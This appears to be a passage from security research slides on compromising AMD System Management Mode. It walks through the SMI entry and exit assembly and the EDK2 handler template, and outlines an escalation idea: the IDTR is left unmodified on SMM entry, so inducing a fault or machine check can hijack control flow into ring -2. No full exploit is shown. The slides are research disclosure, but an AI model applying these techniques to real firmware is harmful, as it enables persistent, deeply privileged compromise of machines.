mov si,0x8148 o32 lgdt [cs:si] mov eax,0x3 mov cr0,eax jmp short 0x14 I/O mov ax,0x18 mov ss,ax Device mov eax,0x9ffe2ff8 microcode mov esp,eax RAM o32 push byte +0x10 open SMRAM mov ecx,0xc0010111 rdmsr mov ebx,eax SMI add eax,0x803a push eax retfd ... SMBASE push rax push rdx SMRAM and rax,~0x7ffffff BF80_0000 CPU wrmsr mov rcx,rsi mov rax,0x9fff492c add rsp,byte +0x20 MMIO mov rcx,0xc0010015 rdmsr test al,0x1 jnz 0x6d3 pop rdx pop rax mov rcx,0xc0010112 wrmsr RAM pop rdx pop rax mov rcx,0xc0010113 wrmsr rsm

## Slide 113

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
push eax
retfd
...
SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 114

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
load SMM state push eax
retfd
...
SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 115

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
load SMM state push eax
retfd
...
jump to SMRAM SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 116

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
load SMM state push eax
retfd
...
jump to SMRAM SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 117

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
load SMM state push eax
retfd
...
jump to SMRAM SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 118

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
load SMM state push eax
retfd
...
jump to SMRAM SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
microcode mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 119

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
load SMM state push eax
retfd
...
jump to SMRAM SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
microcode mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
restore CPU state
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 120

I/O
Device
microcode
RAM
open SMRAM
save CPU state
SMI
load SMM state
jump to SMRAM SMBASE
SMRAM
BF80_0000
CPU
microcode
MMIO
restore CPU state
close SMRAM
RAM

## Slide 121

I/O
Device
microcode
RAM
open SMRAM
save CPU state
SMI
load SMM state
jump to SMRAM SMBASE
SMRAM
BF80_0000
CPU
microcode
MMIO
restore CPU state
close SMRAM
jump to original
code
RAM

## Slide 122

(demo)

system management mode

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
[demo]
system management palelel=
```

## Slide 123

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
deltaop@ubuntu-usb-3:~/_research$ []
```

## Slide 124

⊷Compromising ring -2

⊸ SMM code running in SMRAM ⊸ Corrupt or hijack normal control flow to execute malicious payload

⊸ Unlock SMRAM

system management mode

## Slide 125

⊷CPU modes must share resources with differently privileged modes ⊸ CPU must reset processor context between modes ⊸ Not feasible to reset entire processor context

⊸ Architects carefully select which state to change

⊷Done correctly, event from less privileged mode should not impact more privileged mode

state sanitization

## Slide 126

⊷SMM transition on AMD processors ⊷Sanitize relevant CPU registers ⊷Suppress interrupts ⊸ NMI masked ⊸ INIT ignored ⊸ SMI masked ⊸ Maskable interrupts via IF in eflags ⊸ Debug interrupts/exception via DR7 ⊸ Traps via TF in eflags

# state sanitization

|CS|0000|
|---|---|
|DS|0000|
|ES|0000|
|FS|0000|
|GS|0000|
|SS|0000|
|GPRs|Unmodified|
|EFLAGS|0000_0002|
|RIP|0000_0000_0000_8000|
|CR0|PE, EM, TS, PG cleared|
|CR4|0000_0000_0000_0000|
|GDTR|Unmodified|
|LDTR|Unmodified|
|IDTR|Unmodified|
|TR|Unmodified|
|DR6|Unmodified|
|DR7|0000_0000_0000_0400|
|EFER|All cleared except SVME|

## Slide 127

⊷SMM transition on AMD processors ⊷Sanitize relevant CPU registers ⊷Suppress interrupts ⊸ NMI masked ⊸ INIT ignored ⊸ SMI masked ⊸ Maskable interrupts via IF in eflags ⊸ Debug interrupts/exception via DR7 ⊸ Traps via TF in eflags

# state sanitization

|CS|0000|
|---|---|
|DS|0000|
|ES|0000|
|FS|0000|
|GS|0000|
|SS|0000|
|GPRs|Unmodified|
|EFLAGS|0000_0002|
|RIP|0000_0000_0000_8000|
|CR0|PE, EM, TS, PG cleared|
|CR4|0000_0000_0000_0000|
|GDTR|Unmodified|
|LDTR|Unmodified|
|IDTR|Unmodified|
|TR|Unmodified|
|DR6|Unmodified|
|DR7|0000_0000_0000_0400|
|EFER|All cleared except SVME|

## Slide 128

⊷IDTR points to the Interrupt Descriptor Table (IDT)

⊷IDTR unmodified on entry to SMM

⊷Any interrupt or exception that does occur in SMM will be delivered on an untrusted handler ⊷Basically: `“ try { main() } except { pop_shell() } ”` ⊷Many ways to approach this

⊸ If anything goes wrong, it leads to privilege escalation

⊷One option: induce machine check on the untrusted IDT

state sanitization

## Slide 129

⊷Challenge: CR4 is cleared by microcode ⊸ MCE handling disabled (CPU resets on MCE)

state sanitization

|CS|0000|
|---|---|
|DS|0000|
|ES|0000|
|FS|0000|
|GS|0000|
|SS|0000|
|GPRs|Unmodified|
|EFLAGS|0000_0002|
|RIP|0000_0000_0000_8000|
|CR0|PE, EM, TS, PG cleared|
|CR4|0000_0000_0000_0000|
|GDTR|Unmodified|
|LDTR|Unmodified|
|IDTR|Unmodified|
|TR|Unmodified|
|DR6|Unmodified|
|DR7|0000_0000_0000_0400|
|EFER|All cleared except SVME|

## Slide 130

BITS 16 ASM_PFX(gcSmiHandlerTemplate):

BITS 64 ProtFlatMode:

BITS 16 BITS 64 sub  esp, 4 @LongMode: ASM_PFX(gcSmiHandlerTemplate): ProtFlatMode: xor  rdx, rdx mov  rax, strict qword 0 _SmiEntryPoint: mov  eax, strict dword 0 push rdx SmiHandlerIdtrAbsAddr: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 ASM_PFX(gPatchSmiCr3): jmp  EnableNxe lidt [rax] mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ] mov  cr3, rax lea  ebx, [rdi+DSC_OFFSET] dec  ax mov  eax, 0x668 MsrIa32MiscEnableSupported: mov  ax, [rbx+DSC_DS] mov  [cs:bx], ax mov  ecx, MSR_IA32_MISC_ENABLE mov  ds, eax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  cl, strict byte 0 rdmsr mov  ax, [rbx+DSC_OTHERSEG] mov  [cs:bx+2], eax ASM_PFX(gPatch5LevelPagingNeeded): sub  esp, 4 mov  es, eax o32 lgdt  [cs:bx] cmp  cl, 0 push rdx mov  fs, eax mov  ax, PROTECT_MODE_CS je   SkipEnable5LevelPaging test edx, BIT2 mov  gs, eax mov  [cs:bx-0x2],ax jz   EnableNxe mov  ax, [rbx+DSC_SS] mov  edi, strict dword 0 bts  eax, 12 and  dx, 0xFFFB mov  ss, eax ASM_PFX(gPatchSmbase): SkipEnable5LevelPaging: wrmsr lea  eax, [edi+(@ProtectedModeEnableNxe: mov  rbx, [rsp+0x8] _SmiEntryPoint)+0x8000] mov  cr4, rax mov  ecx, MSR_EFER mov  [cs:bx-0x6],eax rdmsr ... mov  ebx, cr0 sub  esp, 8 or   ax, MSR_EFER_XD and  ebx, 0x9ffafff3 sgdt [rsp] wrmsr mov  rcx, rbx or   ebx, 0x23 mov  eax, [rsp + 2] jmp  @XdDone mov  rax, strict qword 0 mov  cr0, ebx add  esp, 8 @SkipXd: SmiRendezvousAbsAddr: jmp  dword 0x0:0x0 mov  dl, 0x89 sub  esp, 8 call rax _GdtDesc: mov  [rax+TSS_SEGMENT+5], dl @XdDone: DW 0 mov  eax, TSS_SEGMENT ... DD 0 ltr  ax push LONG_MODE_CS call Base rsm BITS 32 mov  al, strict byte 1 Base: @ProtectedMode: ASM_PFX(gPatchXdSupported): add  dword [rsp], @LongMode-Base mov  ax, PROTECT_MODE_DS cmp  al, 0 o16 mov  ds, ax jz   @SkipXd mov  ecx, MSR_EFER o16 mov  es, ax rdmsr o16 mov  fs, ax mov  al, strict byte 1 or   ah, 1 o16 mov  gs, ax ASM_PFX(gPatchMsrIa32MiscEnable…): wrmsr o16 mov  ss, ax cmp  al, 1 mov  rbx, cr0 mov  esp, strict dword 0 jz   MsrIa32MiscEnableSupported or   ebx, 0x80010023 ASM_PFX(gPatchSmiStack): mov  cr0, rbx jmp  ProtFlatMode retf

## Slide 131

BITS 16 BITS 64 sub  esp, 4 @LongMode: ASM_PFX(gcSmiHandlerTemplate): ProtFlatMode: xor  rdx, rdx mov  rax, strict qword 0 _SmiEntryPoint: mov  eax, strict dword 0 push rdx SmiHandlerIdtrAbsAddr: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 ASM_PFX(gPatchSmiCr3): jmp  EnableNxe lidt [rax] mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ] mov  cr3, rax lea  ebx, [rdi+DSC_OFFSET] dec  ax mov  eax, 0x668 MsrIa32MiscEnableSupported: mov  ax, [rbx+DSC_DS] mov  [cs:bx], ax mov  ecx, MSR_IA32_MISC_ENABLE mov  ds, eax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  cl, strict byte 0 rdmsr mov  ax, [rbx+DSC_OTHERSEG] mov  [cs:bx+2], eax ASM_PFX(gPatch5LevelPagingNeeded): sub  esp, 4 mov  es, eax o32 lgdt  [cs:bx] cmp  cl, 0 push rdx mov  fs, eax mov  ax, PROTECT_MODE_CS je   SkipEnable5LevelPaging test edx, BIT2 mov  gs, eax mov  [cs:bx-0x2],ax jz   EnableNxe mov  ax, [rbx+DSC_SS] mov  edi, strict dword 0 bts  eax, 12 and  dx, 0xFFFB mov  ss, eax ASM_PFX(gPatchSmbase): SkipEnable5LevelPaging: wrmsr lea  eax, [edi+(@ProtectedModeEnableNxe: mov  rbx, [rsp+0x8] _SmiEntryPoint)+0x8000] mov  cr4, rax mov  ecx, MSR_EFER mov  [cs:bx-0x6],eax rdmsr ... mov  ebx, cr0 sub  esp, 8 or   ax, MSR_EFER_XD and  ebx, 0x9ffafff3 sgdt [rsp] wrmsr mov  rcx, rbx or   ebx, 0x23 mov  eax, [rsp + 2] jmp  @XdDone mov  rax, strict qword 0 mov  cr0, ebx add  esp, 8 @SkipXd: SmiRendezvousAbsAddr: jmp  dword 0x0:0x0 mov  dl, 0x89 sub  esp, 8 call rax _GdtDesc: mov  [rax+TSS_SEGMENT+5], dl @XdDone: DW 0 mov  eax, TSS_SEGMENT ... DD 0 ltr  ax push LONG_MODE_CS call Base rsm BITS 32 mov  al, strict byte 1 Base: @ProtectedMode: ASM_PFX(gPatchXdSupported): add  dword [rsp], @LongMode-Base mov  ax, PROTECT_MODE_DS cmp  al, 0 o16 mov  ds, ax jz   @SkipXd mov  ecx, MSR_EFER o16 mov  es, ax rdmsr o16 mov  fs, ax mov  al, strict byte 1 or   ah, 1 o16 mov  gs, ax ASM_PFX(gPatchMsrIa32MiscEnable…): wrmsr o16 mov  ss, ax cmp  al, 1 mov  rbx, cr0 mov  esp, strict dword 0 jz   MsrIa32MiscEnableSupported or   ebx, 0x80010023 ASM_PFX(gPatchSmiStack): mov  cr0, rbx jmp  ProtFlatMode retf

## Slide 132

BITS 16 BITS 64 sub  esp, 4 @LongMode: ASM_PFX(gcSmiHandlerTemplate): ProtFlatMode: xor  rdx, rdx mov  rax, strict qword 0 _SmiEntryPoint: mov  eax, strict dword 0 push rdx SmiHandlerIdtrAbsAddr: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 ASM_PFX(gPatchSmiCr3): jmp  EnableNxe lidt [rax] mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ] mov  cr3, rax lea  ebx, [rdi+DSC_OFFSET] dec  ax mov  eax, 0x668 MsrIa32MiscEnableSupported: mov  ax, [rbx+DSC_DS] mov  [cs:bx], ax mov  ecx, MSR_IA32_MISC_ENABLE mov  ds, eax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  cl, strict byte 0 rdmsr mov  ax, [rbx+DSC_OTHERSEG] mov  [cs:bx+2], eax ASM_PFX(gPatch5LevelPagingNeeded): sub  esp, 4 mov  es, eax o32 lgdt  [cs:bx] cmp  cl, 0 push rdx mov  fs, eax mov  ax, PROTECT_MODE_CS je   SkipEnable5LevelPaging test edx, BIT2 mov  gs, eax mov  [cs:bx-0x2],ax jz   EnableNxe mov  ax, [rbx+DSC_SS] mov  edi, strict dword 0 bts  eax, 12 and  dx, 0xFFFB mov  ss, eax ASM_PFX(gPatchSmbase): SkipEnable5LevelPaging: wrmsr lea  eax, [edi+(@ProtectedModeEnableNxe: mov  rbx, [rsp+0x8] _SmiEntryPoint)+0x8000] mov  cr4, rax mov  ecx, MSR_EFER mov  [cs:bx-0x6],eax rdmsr ... mov  ebx, cr0 sub  esp, 8 or   ax, MSR_EFER_XD and  ebx, 0x9ffafff3 sgdt [rsp] wrmsr mov  rcx, rbx or   ebx, 0x23 mov  eax, [rsp + 2] jmp  @XdDone mov  rax, strict qword 0 mov  cr0, ebx add  esp, 8 @SkipXd: SmiRendezvousAbsAddr: jmp  dword 0x0:0x0 mov  dl, 0x89 sub  esp, 8 call rax _GdtDesc: mov  [rax+TSS_SEGMENT+5], dl @XdDone: DW 0 mov  eax, TSS_SEGMENT ... DD 0 ltr  ax push LONG_MODE_CS call Base rsm BITS 32 mov  al, strict byte 1 Base: @ProtectedMode: ASM_PFX(gPatchXdSupported): add  dword [rsp], @LongMode-Base mov  ax, PROTECT_MODE_DS cmp  al, 0 o16 mov  ds, ax jz   @SkipXd mov  ecx, MSR_EFER o16 mov  es, ax rdmsr o16 mov  fs, ax mov  al, strict byte 1 or   ah, 1 o16 mov  gs, ax ASM_PFX(gPatchMsrIa32MiscEnable…): wrmsr o16 mov  ss, ax cmp  al, 1 mov  rbx, cr0 mov  esp, strict dword 0 jz   MsrIa32MiscEnableSupported or   ebx, 0x80010023 ASM_PFX(gPatchSmiStack): mov  cr0, rbx jmp  ProtFlatMode retf

## Slide 133

BITS 16 ASM_PFX(gcSmiHandlerTemplate): _SmiEntryPoint: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ] dec  ax mov  [cs:bx], ax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  [cs:bx+2], eax o32 lgdt  [cs:bx] mov  ax, PROTECT_MODE_CS mov  [cs:bx-0x2],ax mov  edi, strict dword 0 ASM_PFX(gPatchSmbase): lea  eax, [edi+(@ProtectedMode_SmiEntryPoint)+0x8000] mov  [cs:bx-0x6],eax mov  ebx, cr0 and  ebx, 0x9ffafff3 or   ebx, 0x23 mov  cr0, ebx jmp  dword 0x0:0x0 _GdtDesc: DW 0 DD 0

BITS 64 ProtFlatMode:

BITS 16 BITS 64 sub  esp, 4 @LongMode: ASM_PFX(gcSmiHandlerTemplate): ProtFlatMode: xor  rdx, rdx mov  rax, strict qword 0 _SmiEntryPoint: mov  eax, strict dword 0 push rdx SmiHandlerIdtrAbsAddr: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 ASM_PFX(gPatchSmiCr3): jmp  EnableNxe lidt [rax] mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ] mov  cr3, rax lea  ebx, [rdi+DSC_OFFSET] dec  ax mov  eax, 0x668 MsrIa32MiscEnableSupported: mov  ax, [rbx+DSC_DS] mov  [cs:bx], ax mov  ecx, MSR_IA32_MISC_ENABLE mov  ds, eax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  cl, strict byte 0 rdmsr mov  ax, [rbx+DSC_OTHERSEG] mov  [cs:bx+2], eax ASM_PFX(gPatch5LevelPagingNeeded): sub  esp, 4 mov  es, eax o32 lgdt  [cs:bx] cmp  cl, 0 push rdx mov  fs, eax mov  ax, PROTECT_MODE_CS je   SkipEnable5LevelPaging test edx, BIT2 mov  gs, eax mov  [cs:bx-0x2],ax jz   EnableNxe mov  ax, [rbx+DSC_SS] mov  edi, strict dword 0 bts  eax, 12 and  dx, 0xFFFB mov  ss, eax ASM_PFX(gPatchSmbase): SkipEnable5LevelPaging: wrmsr lea  eax, [edi+(@ProtectedModeEnableNxe: mov  rbx, [rsp+0x8] _SmiEntryPoint)+0x8000] mov  cr4, rax mov  ecx, MSR_EFER mov  [cs:bx-0x6],eax rdmsr ... mov  ebx, cr0 sub  esp, 8 or   ax, MSR_EFER_XD and  ebx, 0x9ffafff3 sgdt [rsp] wrmsr mov  rcx, rbx or   ebx, 0x23 mov  eax, [rsp + 2] jmp  @XdDone mov  rax, strict qword 0 mov  cr0, ebx add  esp, 8 @SkipXd: SmiRendezvousAbsAddr: jmp  dword 0x0:0x0 mov  dl, 0x89 sub  esp, 8 call rax _GdtDesc: mov  [rax+TSS_SEGMENT+5], dl @XdDone: DW 0 mov  eax, TSS_SEGMENT ... DD 0 ltr  ax push LONG_MODE_CS call Base rsm BITS 32 mov  al, strict byte 1 Base: @ProtectedMode: ASM_PFX(gPatchXdSupported): add  dword [rsp], @LongMode-Base mov  ax, PROTECT_MODE_DS cmp  al, 0 o16 mov  ds, ax jz   @SkipXd mov  ecx, MSR_EFER o16 mov  es, ax rdmsr o16 mov  fs, ax mov  al, strict byte 1 or   ah, 1 o16 mov  gs, ax ASM_PFX(gPatchMsrIa32MiscEnable…): wrmsr o16 mov  ss, ax cmp  al, 1 mov  rbx, cr0 mov  esp, strict dword 0 jz   MsrIa32MiscEnableSupported or   ebx, 0x80010023 ASM_PFX(gPatchSmiStack): mov  cr0, rbx jmp  ProtFlatMode retf

## Slide 134

BITS 16 ASM_PFX(gcSmiHandlerTemplate): _SmiEntryPoint: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ] dec  ax mov  [cs:bx], ax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  [cs:bx+2], eax o32 lgdt  [cs:bx] mov  ax, PROTECT_MODE_CS mov  [cs:bx-0x2],ax mov  edi, strict dword 0 ASM_PFX(gPatchSmbase): lea  eax, [edi+(@ProtectedMode_SmiEntryPoint)+0x8000] mov  [cs:bx-0x6],eax mov  ebx, cr0 and  ebx, 0x9ffafff3 or   ebx, 0x23 mov  cr0, ebx jmp  dword 0x0:0x0 _GdtDesc: DW 0 DD 0

BITS 64 ProtFlatMode:

BITS 16 BITS 64 sub  esp, 4 @LongMode: ASM_PFX(gcSmiHandlerTemplate): ProtFlatMode: xor  rdx, rdx mov  rax, strict qword 0 _SmiEntryPoint: mov  eax, strict dword 0 push rdx SmiHandlerIdtrAbsAddr: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 ASM_PFX(gPatchSmiCr3): jmp  EnableNxe lidt [rax] mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ] mov  cr3, rax lea  ebx, [rdi+DSC_OFFSET] dec  ax mov  eax, 0x668 MsrIa32MiscEnableSupported: mov  ax, [rbx+DSC_DS] mov  [cs:bx], ax mov  ecx, MSR_IA32_MISC_ENABLE mov  ds, eax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  cl, strict byte 0 rdmsr mov  ax, [rbx+DSC_OTHERSEG] mov  [cs:bx+2], eax ASM_PFX(gPatch5LevelPagingNeeded): sub  esp, 4 mov  es, eax o32 lgdt  [cs:bx] cmp  cl, 0 push rdx mov  fs, eax mov  ax, PROTECT_MODE_CS je   SkipEnable5LevelPaging test edx, BIT2 mov  gs, eax mov  [cs:bx-0x2],ax jz   EnableNxe mov  ax, [rbx+DSC_SS] mov  edi, strict dword 0 bts  eax, 12 and  dx, 0xFFFB mov  ss, eax ASM_PFX(gPatchSmbase): SkipEnable5LevelPaging: wrmsr lea  eax, [edi+(@ProtectedModeEnableNxe: mov  rbx, [rsp+0x8] _SmiEntryPoint)+0x8000] mov  cr4, rax mov  ecx, MSR_EFER mov  [cs:bx-0x6],eax rdmsr ... mov  ebx, cr0 sub  esp, 8 or   ax, MSR_EFER_XD and  ebx, 0x9ffafff3 sgdt [rsp] wrmsr mov  rcx, rbx or   ebx, 0x23 mov  eax, [rsp + 2] jmp  @XdDone mov  rax, strict qword 0 mov  cr0, ebx add  esp, 8 @SkipXd: SmiRendezvousAbsAddr: jmp  dword 0x0:0x0 mov  dl, 0x89 sub  esp, 8 call rax _GdtDesc: mov  [rax+TSS_SEGMENT+5], dl @XdDone: DW 0 mov  eax, TSS_SEGMENT ... DD 0 ltr  ax push LONG_MODE_CS call Base rsm BITS 32 mov  al, strict byte 1 Base: @ProtectedMode: ASM_PFX(gPatchXdSupported): add  dword [rsp], @LongMode-Base mov  ax, PROTECT_MODE_DS cmp  al, 0 o16 mov  ds, ax jz   @SkipXd mov  ecx, MSR_EFER o16 mov  es, ax rdmsr o16 mov  fs, ax mov  al, strict byte 1 or   ah, 1 o16 mov  gs, ax ASM_PFX(gPatchMsrIa32MiscEnable…): wrmsr o16 mov  ss, ax cmp  al, 1 mov  rbx, cr0 mov  esp, strict dword 0 jz   MsrIa32MiscEnableSupported or   ebx, 0x80010023 ASM_PFX(gPatchSmiStack): mov  cr0, rbx jmp  ProtFlatMode retf

## Slide 135

BITS 16 BITS 64 sub  esp, 4 @LongMode: ASM_PFX(gcSmiHandlerTemplate): ProtFlatMode: xor  rdx, rdx mov  rax, strict qword 0 _SmiEntryPoint: mov  eax, strict dword 0 push rdx SmiHandlerIdtrAbsAddr: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 ASM_PFX(gPatchSmiCr3): jmp  EnableNxe lidt [rax] mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ] mov  cr3, rax lea  ebx, [rdi+DSC_OFFSET] dec  ax mov  eax, 0x668 MsrIa32MiscEnableSupported: mov  ax, [rbx+DSC_DS] mov  [cs:bx], ax mov  ecx, MSR_IA32_MISC_ENABLE mov  ds, eax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  cl, strict byte 0 rdmsr mov  ax, [rbx+DSC_OTHERSEG] mov  [cs:bx+2], eax ASM_PFX(gPatch5LevelPagingNeeded): sub  esp, 4 mov  es, eax o32 lgdt  [cs:bx] cmp  cl, 0 push rdx mov  fs, eax mov  ax, PROTECT_MODE_CS je   SkipEnable5LevelPaging test edx, BIT2 mov  gs, eax mov  [cs:bx-0x2],ax jz   EnableNxe mov  ax, [rbx+DSC_SS] mov  edi, strict dword 0 bts  eax, 12 and  dx, 0xFFFB mov  ss, eax ASM_PFX(gPatchSmbase): SkipEnable5LevelPaging: wrmsr lea  eax, [edi+(@ProtectedModeEnableNxe: mov  rbx, [rsp+0x8] _SmiEntryPoint)+0x8000] mov  cr4, rax mov  ecx, MSR_EFER mov  [cs:bx-0x6],eax rdmsr ... mov  ebx, cr0 sub  esp, 8 or   ax, MSR_EFER_XD and  ebx, 0x9ffafff3 sgdt [rsp] wrmsr mov  rcx, rbx or   ebx, 0x23 mov  eax, [rsp + 2] jmp  @XdDone mov  rax, strict qword 0 mov  cr0, ebx add  esp, 8 @SkipXd: SmiRendezvousAbsAddr: jmp  dword 0x0:0x0 mov  dl, 0x89 sub  esp, 8 call rax _GdtDesc: mov  [rax+TSS_SEGMENT+5], dl @XdDone: DW 0 mov  eax, TSS_SEGMENT ... DD 0 ltr  ax push LONG_MODE_CS call Base rsm BITS 32 mov  al, strict byte 1 Base: @ProtectedMode: ASM_PFX(gPatchXdSupported): add  dword [rsp], @LongMode-Base mov  ax, PROTECT_MODE_DS cmp  al, 0 o16 mov  ds, ax jz   @SkipXd mov  ecx, MSR_EFER o16 mov  es, ax rdmsr o16 mov  fs, ax mov  al, strict byte 1 or   ah, 1 o16 mov  gs, ax ASM_PFX(gPatchMsrIa32MiscEnable…): wrmsr o16 mov  ss, ax cmp  al, 1 mov  rbx, cr0 mov  esp, strict dword 0 jz   MsrIa32MiscEnableSupported or   ebx, 0x80010023 ASM_PFX(gPatchSmiStack): mov  cr0, rbx jmp  ProtFlatMode retf

## Slide 136

BITS 16 ASM_PFX(gcSmiHandlerTemplate): _SmiEntryPoint: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ]

dec  ax mov  [cs:bx], ax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  [cs:bx+2], eax o32 lgdt  [cs:bx] mov  ax, PROTECT_MODE_CS mov  [cs:bx-0x2],ax mov  edi, strict dword 0 ASM_PFX(gPatchSmbase): lea  eax, [edi+(@ProtectedMode_SmiEntryPoint)+0x8000] mov  [cs:bx-0x6],eax mov  ebx, cr0 and  ebx, 0x9ffafff3 or   ebx, 0x23 mov  cr0, ebx jmp  dword 0x0:0x0 _GdtDesc: DW 0 DD 0

BITS 32

@ProtectedMode: mov  ax, PROTECT_MODE_DS o16 mov  ds, ax o16 mov  es, ax o16 mov  fs, ax o16 mov  gs, ax o16 mov  ss, ax mov  esp, strict dword 0 ASM_PFX(gPatchSmiStack): jmp  ProtFlatMode

BITS 64 ProtFlatMode:

